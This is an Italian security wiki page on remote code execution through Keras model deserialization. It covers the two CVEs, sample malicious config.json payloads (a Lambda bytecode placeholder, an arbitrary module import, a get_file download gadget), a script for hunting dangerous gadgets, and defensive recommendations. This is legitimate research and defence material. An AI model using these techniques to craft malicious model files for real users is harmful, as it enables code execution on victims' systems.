# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Questa pagina riassume le tecniche di sfruttamento pratico contro il pipeline di deserializzazione del modello Keras, spiega gli interni del formato .keras e la superficie di attacco, e fornisce un toolkit per i ricercatori per trovare Vulnerabilità dei File Modello (MFV) e gadget post-fix.

## Interni del formato modello .keras

Un file .keras è un archivio ZIP che contiene almeno:
- metadata.json – informazioni generiche (ad es., versione Keras)
- config.json – architettura del modello (superficie di attacco principale)
- model.weights.h5 – pesi in HDF5

Il config.json guida la deserializzazione ricorsiva: Keras importa moduli, risolve classi/funzioni e ricostruisce strati/oggetti da dizionari controllati dall'attaccante.

Esempio di frammento per un oggetto di strato Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization esegue:
- Importazione di moduli e risoluzione di simboli dalle chiavi module/class_name
- invocazione di from_config(...) o del costruttore con kwargs controllati dall'attaccante
- Ricorsione in oggetti annidati (attivazioni, inizializzatori, vincoli, ecc.)

Storicamente, questo ha esposto tre primitive a un attaccante che crea config.json:
- Controllo di quali moduli vengono importati
- Controllo di quali classi/funzioni vengono risolte
- Controllo di kwargs passati ai costruttori/from_config

## CVE-2024-3660 – RCE bytecode Lambda-layer

Causa principale:
- Lambda.from_config() utilizzava python_utils.func_load(...) che decodifica in base64 e chiama marshal.loads() sui byte dell'attaccante; la deserializzazione di Python può eseguire codice.

Idea di exploit (payload semplificato in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigazione:
- Keras imposta safe_mode=True per impostazione predefinita. Le funzioni Python serializzate in Lambda sono bloccate a meno che un utente non scelga esplicitamente di disattivare con safe_mode=False.

Note:
- I formati legacy (salvataggi HDF5 più vecchi) o le codebase più vecchie potrebbero non applicare controlli moderni, quindi gli attacchi in stile "downgrade" possono ancora applicarsi quando le vittime utilizzano loader più vecchi.

## CVE-2025-1550 – Importazione di moduli arbitrari in Keras ≤ 3.8

Causa principale:
- _retrieve_class_or_fn utilizzava importlib.import_module() senza restrizioni con stringhe di moduli controllate dall'attaccante da config.json.
- Impatto: Importazione arbitraria di qualsiasi modulo installato (o modulo piantato dall'attaccante su sys.path). Il codice viene eseguito al momento dell'importazione, quindi si verifica la costruzione dell'oggetto con kwargs dell'attaccante.

Idea di sfruttamento:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Miglioramenti della sicurezza (Keras ≥ 3.9):
- Elenco di moduli consentiti: importazioni limitate ai moduli ufficiali dell'ecosistema: keras, keras_hub, keras_cv, keras_nlp
- Modalità sicura predefinita: safe_mode=True blocca il caricamento di funzioni serializzate Lambda non sicure
- Controllo dei tipi di base: gli oggetti deserializzati devono corrispondere ai tipi attesi

## Superficie gadget post-fix all'interno dell'elenco consentito

Anche con l'elenco consentito e la modalità sicura, rimane una superficie ampia tra le chiamate Keras consentite. Ad esempio, keras.utils.get_file può scaricare URL arbitrari in posizioni selezionabili dall'utente.

Gadget tramite Lambda che fa riferimento a una funzione consentita (non bytecode Python serializzato):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Importante limitazione:
- Lambda.call() aggiunge il tensore di input come primo argomento posizionale quando invoca il callable target. I gadget scelti devono tollerare un argomento posizionale extra (o accettare *args/**kwargs). Questo limita quali funzioni sono valide.

Impatti potenziali dei gadget autorizzati:
- Download/scrittura arbitraria (piantagione di percorsi, avvelenamento della configurazione)
- Callback di rete/effetti simili a SSRF a seconda dell'ambiente
- Collegamento all'esecuzione del codice se i percorsi scritti vengono successivamente importati/eseguiti o aggiunti a PYTHONPATH, o se esiste una posizione di esecuzione scrivibile

## Toolkit del ricercatore

1) Scoperta sistematica di gadget nei moduli consentiti

Enumerare i callable candidati tra keras, keras_nlp, keras_cv, keras_hub e dare priorità a quelli con effetti collaterali su file/rete/processo/ambiente.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Test di deserializzazione diretta (nessun archivio .keras necessario)

Fornire dizionari creati direttamente ai deserializzatori Keras per apprendere i parametri accettati e osservare gli effetti collaterali.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Probing e formati tra versioni

Keras esiste in più codebase/epoche con diverse protezioni e formati:
- Keras integrato in TensorFlow: tensorflow/python/keras (legacy, previsto per la cancellazione)
- tf-keras: mantenuto separatamente
- Keras 3 multi-backend (ufficiale): introdotto il .keras nativo

Ripeti i test tra codebase e formati (.keras vs legacy HDF5) per scoprire regressioni o protezioni mancanti.

## Raccomandazioni difensive

- Tratta i file modello come input non attendibili. Carica modelli solo da fonti fidate.
- Tieni Keras aggiornato; usa Keras ≥ 3.9 per beneficiare di allowlisting e controlli di tipo.
- Non impostare safe_mode=False quando carichi modelli a meno che non ti fidi completamente del file.
- Considera di eseguire la deserializzazione in un ambiente sandboxed, con privilegi minimi, senza uscita di rete e con accesso al filesystem ristretto.
- Applica allowlists/firme per le fonti dei modelli e controlli di integrità dove possibile.

## Riferimenti

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
